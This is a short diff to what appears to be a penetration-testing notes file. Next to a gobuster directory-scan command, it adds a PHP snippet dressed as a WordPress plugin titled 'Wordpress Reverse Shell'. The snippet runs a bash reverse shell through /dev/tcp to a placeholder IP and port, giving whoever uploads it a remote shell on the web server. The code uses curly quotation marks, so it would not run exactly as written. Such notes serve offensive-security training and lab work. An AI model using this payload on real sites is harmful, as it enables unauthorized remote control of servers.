@@ -311,6 +311,17 @@ gobuster dir -u http://<TARGET_IP> -w <PATH_TO_WORDLIST> -o <OUTPUT_FILE_NAME> -
 
 ```
 
+php_shell
+```php_shell
+<?php
+/**
+ * Plugin Name: Wordpress Reverse Shell
+ * Author: azkrath
+ */
+exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<IP>/<Port> 0>&1’”)
+?>
+```
+
 
 
 resources:
